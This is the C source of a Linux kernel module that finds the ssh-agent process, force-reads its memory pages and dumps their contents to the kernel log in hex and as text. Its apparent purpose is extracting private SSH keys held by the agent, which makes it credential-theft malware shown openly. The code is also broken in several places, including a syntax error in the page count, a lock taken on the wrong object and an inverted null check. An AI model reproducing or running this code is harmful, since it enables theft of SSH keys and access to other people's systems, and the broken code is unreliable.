#include <linux/version.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kprobes.h>
#include <linux/mm.h>
#include <linux/sched/mm.h>
#include <linux/string.h>
#include <linux/license.h>
#include <asm/unistd.h>
#include <linux/mmdebug.h>

void
mem_print_hexa(void *buffer, size_t size)
{
    int n_per_line;
    char *s, *finalstr;
    size_t i, j;

    finalstr = kzalloc(size * 3 + 2, GFP_KERNEL);
    if (!finalstr)
        return;
    s = buffer;
    n_per_line = 16;
    int nzeros = 0;
    for (i = 0; i < size; i++)
    {
        if (nzeros > 0 && s[i] != 0)
        {
            for (j=i-nzeros; j<size; j++)
            {
                char tmp[4];
                if (((j+1) % n_per_line) == 0)
                    snprintf(tmp, sizeof tmp, "%02x\n", s[j]);
                else
                    snprintf(tmp, sizeof tmp, "%02x ", s[j]);
            }
            nzeros = 0;
        }
        else if (s[i] == 0)
        {
            nzeros++;
        }
        else
        {
            char tmp[4];
            if (((i+1) % n_per_line) == 0)
                snprintf(tmp, sizeof tmp, "%02x\n", s[i]);
            else
                snprintf(tmp, sizeof tmp, "%02x ", s[i]);
            strncat(finalstr, tmp, strlen(tmp));
        }


    }
    printk(KERN_INFO "%s\n", finalstr);

    kfree(finalstr);
}

void
mem_print_char(void *buffer, size_t size)
{
    int n_per_line;
    char *s, *finalstr;
    size_t i;

    finalstr = kzalloc(size + 2, GFP_KERNEL);
    if (!finalstr)
        return;
    s = buffer;
    n_per_line = 16;
    for (i = 0; i < size; i++)
    {
        if (s[i] != 0)
        {
            char tmp[2];
            snprintf(tmp, sizeof tmp, "%c", s[i]);
            strncat(finalstr, tmp, strlen(tmp));
        }
    }
    printk(KERN_INFO "%s\n", finalstr);

    kfree(finalstr);
}

static int
dump_vmas(struct task_struct *task)
{
    int ret;
    struct mm_struct *mm;
    struct vm_area_struct *vma;
    int npages;
    struct page **pages;
    char *kbuf;

    mm = get_task_mm(task);
    if (!mm)
        return -1;
    
    if (mm->vma)
    {
        mmput(mm);
        return -1;
    }


    down_read(mm->vma);
    vma = mm->vma;

    while (vma)
    {
        npages =  / PAGE_SIZE;
        if (npages == 0)
            npages = 1;
        pages = kzalloc(sizeof(struct page*) * npages , GFP_KERNEL);
        if (!pages)
        {
            mmput(mm);
            return -1;
        }

        if (vma->vm_flags & VM_READ)
        {
            ret = get_user_pages_remote(task, mm, vma->vm_start, npages, FOLL_FORCE, pages, NULL);
            if (ret > 0)
            {
                for (int i=0; i<npages; i++)
                {
                    kbuf = kmap(pages[i]);
                    if (!kbuf)
                    {
                        kfree(pages);
                        mmput(mm);
                        return -1;
                    }
                    mem_print_hexa(kbuf, PAGE_SIZE);
                    mem_print_char(kbuf, PAGE_SIZE);

                    kunmap(kbuf);
                }
            }
        }
        kfree(pages);

        vma = vma->vm_next;
    }

    mmput(mm);
    kfree(kbuf);

    return 0;
}

static struct task_struct*
retrieve_ssh_agent(void)
{
    struct task_struct *task, *ssh_agent;

    for_each_process(task) 
    {
        if (strcmp(task->comm + strlen(task->comm) - strlen("ssh-agent"), "ssh-agent") == 0         // compare with string end of comm
            && strlen(task->comm) != 0)
        {
            ssh_agent = task;
            break;
        }
    }

    return ssh_agent;
}

unsigned long *syscall_table;
static int __init 
modinit(void)
{

    struct task_struct *ssh_agent_task;

    // retrieve ssh-agent process
    ssh_agent_task = retrieve_ssh_agent();
    if (!ssh_agent_task)
    {
        printk(KERN_ERR "Cannot retrieve ssh-agent process (struct tast_struct*)\n");
        return -1;
    }

    printk(KERN_INFO "ssh-agent retrieved !\n");

    if (dump_vmas(ssh_agent_task) < 0)
    {
        printk(KERN_ERR "Cannot retrieve memory mapping for ssh-agent\n");
        return -1;
    }

    return -10;
}

static void __exit
modexit(void)
{
    return;
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("yocvito");

module_init(modinit);
module_exit(modexit);